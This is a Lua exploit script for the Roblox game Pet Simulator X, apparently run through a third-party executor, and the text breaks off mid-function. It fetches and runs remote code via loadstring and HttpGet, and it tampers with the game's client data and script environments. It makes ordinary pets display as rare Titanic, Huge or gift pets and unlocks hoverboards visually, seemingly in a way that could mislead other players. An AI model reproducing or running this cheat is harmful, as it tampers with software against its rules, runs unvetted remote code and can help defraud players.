local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "SimoNHub Visual Script | Pet Simulator X",
    LoadingTitle = "SimoNHub Visual...",
    LoadingSubtitle = "by HerrrSimoN#2115",
    ConfigurationSaving = {
        Enabled = false,
        FolderName = "SimoNHub Visual", 
        FileName = "SimoNHub"
    },
    Discord = {
        Enabled = true,
        Invite = "simonhub",  
        RememberJoins = false 
    },
    KeySystem = true,         -- Set this to true to use our key system
    KeySettings = {
        Title = "SimoNHub Visual Key",
        Subtitle = "Key System",
        Note = "Join discord https://discord.gg/simonhub",
        FileName = "SimoNHub",
        SaveKey = true,
        GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
        Key = "SimoNHubOnTop"
    }
})
 
-- Notifying Functions
local v2 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
local singstop
local function wrong()
    Rayfield:Notify({
        Title = "Wrong Pet",
        Content = "Please Enter A Valid Pet Name",
        Duration = 1,
        Image = 9003576350,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Understood!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
local function wrong2()
    Rayfield:Notify({
        Title = "No Pet",
        Content = "Please Enter A Pet Name",
        Duration = 1,
        Image = 9003568230,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Okay!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
local function nothuge()
    Rayfield:Notify({
        Title = "Not A Huge Pet",
        Content = "Please Put A Huge Pet",
        Duration = 1,
        Image = 9003575074,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Okay!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
local function nottext()
    Rayfield:Notify({
        Title = "No Text",
        Content = "Please Enter A Text",
        Duration = 1,
        Image = 8997529686,
        Actions = {
            -- Notification Buttons
            Ignore = {
                Name = "Okay!",
                Callback = function()
                    --   print("The user tapped Okay!")
                end
            },
        },
    })
end
-- Other Functions
 
function table_contains(tbl, x)
    found = false
    for _, v in pairs(tbl) do
        if v == x then
            found = true
        end
    end
    return found
end
 
function deletevalues(tbl, value)
    for k, v in pairs(tbl) do
        if v ~= value then
            tbl[k] = nil
        end
    end
end
 
function removeValueFromTable(table, value)
    for key, val in pairs(table) do
        if val == value or key == value then
            table[key] = nil
            return true
        end
    end
    return false
end
 
game:GetService("ReplicatedStorage").Assets.UI.FRAMEWORK.InfoOverlay.Blocks.Rare.Visible = false
 
-- Enchanting Fucntions
nkList = {}
function ttenchant()
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    TitanicList = {}
    TList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.titanic then
            table.insert(TitanicList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(TitanicList, v["id"]) ~= nil then
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            if not v.powers[2] then
                v.powers[2] = {}
                v.powers[2][1] = "Strength"
                v.powers[2][2] = math.random(1, 5)
            end
            v.powers[1][1] = "Titanic"
            v.powers[1][2] = 1
            if v.nk == nil then
                v.nk = "Nxll"
            end
            table.insert(TList, v["uid"])
        end
        for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
            if table_contains(TList, V.Name) then
                V:Destroy()
            end
        end
    end
    spawn(function()
        while task.wait(0.01) do
            ETList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.titanic then
                    table.insert(ETList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(ETList, v["id"]) ~= nil then
                    if not table_contains(nkList, v.nk) and not v.isGift then
                        if not v.powers then
                            v.powers = {}
                        end
                        if not v.powers[1] then
                            v.powers[1] = {}
                        end
                        if not v.powers[2] then
                            v.powers[2] = {}
                            v.powers[2][1] = "Strength"
                            v.powers[2][2] = math.random(1, 5)
                        end
                        v.powers[1][1] = "Titanic"
                        v.powers[1][2] = 1
                        if v.nk ~= getgenv().newtext then
                            table.insert(nkList, v.nk)
                        end
                        if table_contains(nkList, getgenv().newtext) then
                            if removeValueFromTable(nkList, getgenv().newtext) then
                                print("deleted")
                            end
                        end
                    end
                end
            end
        end
    end)
end
 
Hnk = {}
function henchant(hname, lname)
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    HugeList = {}
    HList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == hname or v.name == lname then
            table.insert(HugeList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(HugeList, v["id"]) ~= nil then
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            if not v.powers[2] then
                v.powers[2] = {}
                v.powers[2][1] = "Strength"
                v.powers[2][2] = math.random(1, 5)
            end
            v.powers[1][1] = "Best Friend"
            v.powers[1][2] = 1
            if v.nk == nil then
                v.nk = "Nxll"
            end
            table.insert(HList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(HList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(HList, V.Name) then
            V:Destroy()
        end
    end
    spawn(function()
        while task.wait(0.01) do
            HHList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.huge then
                    table.insert(HHList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(HHList, v["id"]) ~= nil then
                    if not table_contains(Hnk, v.nk) and not v.isGift then
                        if not v.powers then
                            v.powers = {}
                        end
                        if not v.powers[1] then
                            v.powers[1] = {}
                        end
                        if not v.powers[2] then
                            v.powers[2] = {}
                            v.powers[2][1] = "Strength"
                            v.powers[2][2] = math.random(1, 5)
                        end
                        v.powers[1][1] = "Best Friend"
                        v.powers[1][2] = 1
                        if v.nk ~= getgenv().newtext then
                            table.insert(Hnk, v.nk)
                        end
                        if table_contains(Hnk, getgenv().newtext) then
                            if removeValueFromTable(Hnk, getgenv().newtext) then
                                print("deleted")
                            end
                        end
                    end
                end
            end
        end
    end)
end
 
Enk = {}
function excenchant(excname, fppname)
    tttohugecheck = false
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    ExcList = {}
    EList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == excname or v.name == fppname then
            table.insert(ExcList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(ExcList, v["id"]) ~= nil then
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            if not v.powers[2] then
                v.powers[2] = {}
                v.powers[2][1] = "Strength"
                v.powers[2][2] = math.random(1, 5)
            end
            v.powers[1][1] = "Companion"
            v.powers[1][2] = 2
            if v.nk == nil then
                v.nk = "Nxll"
            end
            table.insert(EList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(EList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(EList, V.Name) then
            V:Destroy()
        end
    end
    spawn(function()
        while task.wait(0.01) do
            EEList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.name == excname then
                    table.insert(EEList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(EEList, v["id"]) ~= nil then
                    if not table_contains(Enk, v.nk) and not v.isGift then
                        if not v.powers then
                            v.powers = {}
                        end
                        if not v.powers[1] then
                            v.powers[1] = {}
                        end
                        if not v.powers[2] then
                            v.powers[2] = {}
                            v.powers[2][1] = "Strength"
                            v.powers[2][2] = math.random(1, 5)
                        end
                        v.powers[1][1] = "Companion"
                        v.powers[1][2] = 2
                        if v.nk ~= getgenv().newtext then
                            table.insert(Enk, v.nk)
                        end
                        if table_contains(Enk, getgenv().newtext) then
                            if removeValueFromTable(Enk, getgenv().newtext) then
                                print("deleted")
                            end
                        end
                    end
                end
            end
        end
    end)
end
 
Bnk = {}
function bananaenchant()
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    BananaList = {}
    BList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == "banana" or v.name == "Dog" then
            table.insert(BananaList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(BananaList, v["id"]) ~= nil then
            if not v.powers then
                v.powers = {}
            end
            if not v.powers[1] then
                v.powers[1] = {}
            end
            local value1 = "Royalty"
            local value2 = "Magnet"
            local value3 = "Glittering"
 
            local randomIndex = math.random(1, 3)
 
            local randomValue
            if randomIndex == 1 then
                randomValue = value1
            elseif randomIndex == 2 then
                randomValue = value2
            else
                randomValue = value3
            end
            v.powers[1][1] = randomValue
            v.powers[1][2] = 1
            v.powers[2] = nil
            if v.nk == nil then
                v.nk = "Nxll"
            end
            table.insert(BList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(BList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(BList, V.Name) then
            V:Destroy()
        end
    end
    spawn(function()
        while task.wait(0.01) do
            BBList = {}
            table.foreach(Library.Directory.Pets, function(i, v)
                if v.name == "banana" then
                    table.insert(BBList, i)
                end
            end)
            local lpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local ly = {}
            for i, v in pairs(lpets) do
                ly[v["uid"]] = false
            end
            for i, v in pairs(lpets) do
                if table.find(BBList, v["id"]) ~= nil then
                    if not table_contains(Bnk, v.nk) and not v.isGift then
                        if not v.powers then
                            v.powers = {}
                        end
                        if not v.powers[1] then
                            v.powers[1] = {}
                        end
                        local value1 = "Royalty"
                        local value2 = "Magnet"
                        local value3 = "Glittering"
 
                        local randomIndex = math.random(1, 3)
 
                        local randomValue
                        if randomIndex == 1 then
                            randomValue = value1
                        elseif randomIndex == 2 then
                            randomValue = value2
                        else
                            randomValue = value3
                        end
                        v.powers[1][1] = randomValue
                        v.powers[1][2] = 1
                        v.powers[2] = nil
                        table.insert(Bnk, v.nk)
                    end
                    if table_contains(Bnk, getgenv().newtext) then
                        if removeValueFromTable(Bnk, getgenv().newtext) then
                            print("deleted")
                        end
                    end
                end
            end
        end
    end)
end
 
function giftenchant(gfname, pname)
    Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
    Functions = Library.Functions
    GiftList = {}
    GList = {}
    table.foreach(Library.Directory.Pets, function(i, v)
        if v.name == gfname or v.name == pname then
            table.insert(GiftList, i)
        end
    end)
    local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
    local y = {}
    for i, v in pairs(pets) do
        y[v["uid"]] = false
    end
    for i, v in pairs(pets) do
        if table.find(GiftList, v["id"]) ~= nil then
            v.powers = nil
            v.snk = nil
            v.nk = nil
            table.insert(GList, v["uid"])
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal:GetDescendants()) do
        if table_contains(GList, V.Name) then
            V:Destroy()
        end
    end
    for I, V in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetDescendants()) do
        if table_contains(GList, V.Name) then
            V:Destroy()
        end
    end
end
 
function sign()
    spawn(function()
        while singstop do
            task.wait(0.1)
            if game:GetService("Players").LocalPlayer.PlayerGui.Rename.Frame.SignInfo.Visible == false then
                game:GetService("Players").LocalPlayer.PlayerGui.Rename.Frame.SignInfo.Visible = true
            end
            local pets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
            local y = {}
            for i, v in pairs(pets) do
                y[v["uid"]] = false
            end
            for i, v in pairs(pets) do
                if v.nk == getgenv().newtext and v.snk ~= true then
                    v.snk = true
                end
            end
        end
    end)
end
 
-- Titanics
 
local fpet
local fpetID
local Tab = Window:CreateTab("Titanics", 12378209702) -- Title, Image
local Paragraph = Tab:CreateParagraph({
    Title = "Requirements",
    Content =  [[Experiencing Bugs/Errors? Contact Support, discord.gg/psxscripts]]
})
local Input = Tab:CreateInput({
    Name = "Pet To Replace",
    PlaceholderText = "Party Dog",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        fpetID = nil
        if Text == "" or Text == nil then
            fpet = nil
        else
            fpet = Text
        end
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local fpetcsm = string.split(v.Name, " - ")[2]
            if fpetcsm == tostring(fpet) then
                fpetID = string.split(v.Name, " - ")[1]
            end
        end
    end,
})
 
-- Titanic Replacament
local titanicname
function TitanicChange()
    if fpetID == nil and fpet ~= nil then
        wrong()
    elseif fpet == nil then
        wrong2()
    end
    if fpet ~= nil and fpetID ~= nil then
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local titanicsm = string.split(v.Name, " - ")[2]
            if titanicsm == tostring(titanicname) then
                local titanicID = string.split(v.Name, " - ")[1]
                local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[fpetID .. " - " .. fpet]
                    ["Pet Data (" .. fpet .. ")"])
                v1.name = titanicname
                v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [titanicID .. " - " .. titanicname]
                    .Pet
                v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [titanicID .. " - " .. titanicname].Golden
                local v11 = {}
                v11.random = {}
                v1.sounds = v11
                v1.fly = require(v:FindFirstChildOfClass("ModuleScript")).fly
                v1.titanic = true
                v1.isGift = false
                v1.giftEggId = nil
                v1.giftCallback = nil
                v1.balloon = require(v:FindFirstChildOfClass("ModuleScript")).balloon
                v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                v1.darkMatterThumbnail = ""
                v1.rarity = "Exclusive"
                v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                v1.tradeable = true
                v1.strengthMin = 2
                v1.strengthMax = 3
                v1.petFlyHeight = require(v:FindFirstChildOfClass("ModuleScript")).petFlyHeight
                v1.ridingGravity = require(v:FindFirstChildOfClass("ModuleScript")).ridingGravity
                v1.ridingJumpPower = require(v:FindFirstChildOfClass("ModuleScript")).ridingJumpPower
                v1.ridingCameraOffset = require(v:FindFirstChildOfClass("ModuleScript")).ridingCameraOffset
                ttenchant()
                break
            end
        end
    end
end
 
local Section = Tab:CreateSection("Normal Titanics")
local Button = Tab:CreateButton({
    Name = "Titanic Jolly Cat",
    Callback = function()
        titanicname = "Titanic Jolly Cat"
        TitanicChange()
    end,
})
local Button = Tab:CreateButton({
    Name = "Titanic Balloon Monkey",
    Callback = function()
        titanicname = "Titanic Balloon Monkey"
        TitanicChange()
    end,
})
local Button = Tab:CreateButton({
    Name = "Titanic Neon Agony",
    Callback = function()
        titanicname = "Titanic Neon Agony"
        TitanicChange()
    end,
})
local Button = Tab:CreateButton({
    Name = "Titanic Hubert",
    Callback = function()
        titanicname = "Titanic Hubert"
        TitanicChange()
    end,
})
local Button = Tab:CreateButton({
    Name = "Titanic Red Balloon Cat",
    Callback = function()
        titanicname = "Titanic Red Balloon Cat"
        TitanicChange()
    end,
})
local Button = Tab:CreateButton({
    Name = "Titanic Blue Balloon Cat",
    Callback = function()
        titanicname = "Titanic Blue Balloon Cat"
        TitanicChange()
    end,
})
local Button = Tab:CreateButton({
    Name = "Titanic Dominus Astra",
    Callback = function()
        titanicname = "Titanic Dominus Astra"
        TitanicChange()
    end,
})
local Button = Tab:CreateButton({
    Name = "Titanic Blobfish",
    Callback = function()
        titanicname = "Titanic Blobfish"
        TitanicChange()
    end,
})
local Button = Tab:CreateButton({
    Name = "Titanic Hologram Cat",
    Callback = function()
        titanicname = "Titanic Hologram Cat"
        TitanicChange()
    end,
})
local Section = Tab:CreateSection("Admin Titanics")
local Button = Tab:CreateButton({
    Name = "Titanic Hippomelon",
    Callback = function()
        titanicname = "Titanic Hippomelon"
        TitanicChange()
    end,
})
local Section = Tab:CreateSection("Merch Titanics")
local Button = Tab:CreateButton({
    Name = "Titanic Lucki",
    Callback = function()
        titanicname = "Titanic Lucki"
        TitanicChange()
    end,
})
local Button = Tab:CreateButton({
    Name = "Titanic banana",
    Callback = function()
        titanicname = "Titanic Banana"
        TitanicChange()
    end,
})
local Button = Tab:CreateButton({
    Name = "Titanic Capybara",
    Callback = function()
        titanicname = "Titanic Capybara"
        TitanicChange()
    end,
})
local Tab2 = Window:CreateTab("Huges", 12371216119) -- Title, Image
local Paragraph2 = Tab2:CreateParagraph({
    Title = "Note :",
    Content =
    [[
 
You Can Change Multiple Pets
Use The Grid Toggle To Update The Pets
You Can Use Any Pet You Want Dm HerrrSimoN#2115 If You Encountered Some Error(s)
]]
})
local fpet2
local fpetID2
local Input2 = Tab2:CreateInput({
    Name = "Pet To Replace",
    PlaceholderText = "Party Dog",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        fpetID2 = nil
        if Text == "" or Text == nil then
            fpet2 = nil
        else
            fpet2 = Text
        end
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local fpetcsm = string.split(v.Name, " - ")[2]
            if fpetcsm == tostring(fpet2) then
                fpetID2 = string.split(v.Name, " - ")[1]
            end
        end
    end,
})
local Huge
local HugeID
function CheckHuge(Text)
    HugeID = nil
    if Text == "" or Text == nil then
        Huge = nil
    else
        Huge = Text
    end
    for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
        local fpetcsm = string.split(v.Name, " - ")[2]
        if fpetcsm == tostring(Huge) then
            HugeID = string.split(v.Name, " - ")[1]
        end
    end
end
 
local Input3 = Tab2:CreateInput({
    Name = "The Huge Pet",
    PlaceholderText = "Huge Pumpkin Cat",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        CheckHuge(Text)
    end,
})
function HugeChange()
    getgenv().hugecheck = false
    if fpetID2 == nil and fpet2 ~= nil or HugeID == nil and Huge ~= nil then
        wrong()
    elseif fpet2 == nil or Huge == nil then
        wrong2()
    end
    if fpet2 ~= nil and fpetID2 ~= nil and Huge ~= nil and HugeID ~= nil then
        local petname = Huge
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local titanicsm = string.split(v.Name, " - ")[2]
            if titanicsm == tostring(petname) then
                local titanicID = string.split(v.Name, " - ")[1]
                if require(v:FindFirstChildOfClass("ModuleScript")).huge then
                    hugecheck = true
                else
                    hugecheck = false
                end
                break
            end
        end
        if hugecheck then
            task.wait(0.01)
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local titanicsm = string.split(v.Name, " - ")[2]
                if titanicsm == tostring(petname) then
                    local HugeI = string.split(v.Name, " - ")[1]
                    local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [fpetID2 .. " - " .. fpet2]
                        ["Pet Data (" .. fpet2 .. ")"])
                    v1.name = petname
                    v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [HugeI .. " - " .. petname]
                        .Pet
                    v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [HugeI .. " - " .. petname].Golden
                    local v11 = {}
                    v11.random = {}
                    v1.sounds = v11
                    v1.fly = require(v:FindFirstChildOfClass("ModuleScript")).fly
                    v1.huge = true
                    v1.titanic = false
                    v1.balloon = require(v:FindFirstChildOfClass("ModuleScript")).balloon
                    v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                    v1.darkMatterThumbnail = ""
                    v1.rarity = "Exclusive"
                    v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                    v1.tradeable = true
                    v1.strengthMin = 2
                    v1.strengthMax = 3
                    v1.isGift = false
                    v1.giftEggId = nil
                    v1.giftCallback = nil
                    v1.hidden = false
                    henchant(petname, fpet2)
                    break
                end
            end
        else
            nothuge()
        end
    end
end
 
local Button = Tab2:CreateButton({
    Name = "Replace",
    Callback = function()
        HugeChange()
    end,
})
local Section = Tab2:CreateSection("Admin Huges")
local Button = Tab2:CreateButton({
    Name = "Huge Lovemelon",
    Callback = function()
        Huge = "Huge Lovemelon"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Hippomelon",
    Callback = function()
        Huge = "Huge Hippomelon"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Coin",
    Callback = function()
        Huge = "Huge Coin"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Pink Lucky Block",
    Callback = function()
        Huge = "Huge Pink Lucky Block"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Rainbow Lucky Block",
    Callback = function()
        Huge = "Huge Rainbow Lucky Block"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Samurai Bull",
    Callback = function()
        Huge = "Huge Samurai Bull"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Samurai Dragon",
    Callback = function()
        Huge = "Huge Samurai Dragon"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Otter",
    Callback = function()
        Huge = "Huge Otter"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Button = Tab2:CreateButton({
    Name = "Huge Unicorn",
    Callback = function()
        Huge = "Huge Unicorn"
        CheckHuge(Huge)
        task.wait()
        HugeChange()
    end,
})
local Tab4 = Window:CreateTab("Gifts/Eggs", 10015952468) -- Title, Image
local Paragraph4 = Tab4:CreateParagraph({
    Title = "Note :",
    Content = [[SimoNHub ON TOP]]
})
local Tab5 = Window:CreateTab("Hoverboards", 12712051608) -- Title, Image
local Paragraph5 = Tab5:CreateParagraph({
    Title = "Note :",
    Content = [[Visual Hoverboards]]
})
local Button = Tab5:CreateButton({
    Name = "Unlock Hoverboards",
    Callback = function()   
        require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Hoverboards = {}
        for i,v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Hoverboards:GetChildren())do
            if v:IsA("Folder") then
             table.insert(require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Hoverboards, v.Name)
            end
        end
        getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Hoverboards).Update()
            getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Hoverboards).Equip = function(board)
                require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().EquippedHoverboard = board
            getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs.Hoverboards).Update()
        end
    end
})
local fpet4
local fpetID4
local Input4 = Tab4:CreateInput({
    Name = "Pet To Replace",
    PlaceholderText = "Cat",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        fpetID4 = nil
        if Text == "" or Text == nil then
            fpet4 = nil
        else
            fpet4 = Text
        end
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local fpetcsm = string.split(v.Name, " - ")[2]
            if fpetcsm == tostring(fpet4) then
                fpetID4 = string.split(v.Name, " - ")[1]
            end
        end
    end,
})
local option
local Button = Tab4:CreateButton({
    Name = "Replace",
    Callback = function()
        if fpetID4 == nil and fpet4 ~= nil then
            wrong()
        elseif fpet4 == nil then
            wrong2()
        end
        if fpet4 ~= nil and fpetID4 ~= nil then
            local petname = option
            task.wait(0.01)
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local titanicsm = string.split(v.Name, " - ")[2]
                if titanicsm == tostring(petname) then
                    local HugeI = string.split(v.Name, " - ")[1]
                    local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [fpetID4 .. " - " .. fpet4]
                        ["Pet Data (" .. fpet4 .. ")"])
                    v1.name = petname
                    v1.model = nil
                    v1.modelGold = nil
                    local v11 = {}
                    v11.random = {}
                    v1.sounds = v11
                    v1.fly = nil
                    v1.huge = nil
                    v1.titanic = nil
                    v1.balloon = nil
                    v1.goldenThumbnail = nil
                    v1.darkMatterThumbnail = nil
                    v1.rarity = "Exclusive"
                    v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                    v1.tradeable = true
                    v1.strengthMin = nil
                    v1.strengthMax = nil
                    v1.companionEnchantLevel = nil
                    v1.ignoreConvert = nil
                    v1.isGift = true
                    v1.giftEggId = petname
                    v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    v1.giftCallback = function(p1, p2)
                    end
                    if string.split(petname, " ")[1] == "Hype" then
                        v1.name = "Update Hype Gift"
                    end
                    giftenchant(petname, fpet4)
                    break
                end
            end
        end
    end,
})
local Section = Tab4:CreateSection("Eggs")
local Dropdown = Tab4:CreateDropdown({
    Name = "Exclusive Egg",
    Options = { "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11" },
    CurrentOption = "Choose",
    Flag = "Dropdown1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        option = "Exclusive Egg " .. Option
    end,
})
local Dropdown = Tab4:CreateDropdown({
    Name = "Season 1 Gifts",
    Options = { "Basic", "Rare", "Epic", "Legendary", "Mythical" },
    CurrentOption = "Choose",
    Flag = "Dropdown2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        option = "Season 1 " .. Option .. " Gift"
    end,
})
local Dropdown = Tab4:CreateDropdown({
    Name = "Hype Gifts",
    Options = { "1", "2" },
    CurrentOption = "Choose",
    Flag = "Dropdown3", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Option)
        option = "Hype Gift " .. Option
    end,
})
local petname4
local petnameID
function giftchange()
    if fpetID4 == nil and fpet4 ~= nil then
        wrong()
    elseif fpet4 == nil then
        wrong2()
    end
    if fpet4 ~= nil and fpetID4 ~= nil then
        task.wait(0.01)
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local titanicsm = string.split(v.Name, " - ")[2]
            if titanicsm == tostring(petnameID) then
                local HugeI = string.split(v.Name, " - ")[1]
                local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [fpetID4 .. " - " .. fpet4]
                    ["Pet Data (" .. fpet4 .. ")"])
                v1.name = petname4
                v1.model = nil
                v1.modelGold = nil
                local v11 = {}
                v11.random = {}
                v1.sounds = v11
                v1.fly = nil
                v1.huge = nil
                v1.titanic = nil
                v1.balloon = nil
                v1.goldenThumbnail = nil
                v1.darkMatterThumbnail = nil
                v1.rarity = "Exclusive"
                v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                v1.tradeable = true
                v1.strengthMin = nil
                v1.strengthMax = nil
                v1.companionEnchantLevel = nil
                v1.ignoreConvert = nil
                v1.isGift = true
                v1.giftEggId = petnameID
                v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                v1.giftCallback = function(p1, p2)
                end
                giftenchant(petname4, fpet4)
                break
            end
        end
    end
end
 
local Section = Tab4:CreateSection("Others (Instant Replace)")
local Button = Tab4:CreateButton({
    Name = "Huge Machine Egg",
    Callback = function()
        petname4 = "Huge Machine Egg 1"
        petnameID = petname4
        giftchange()
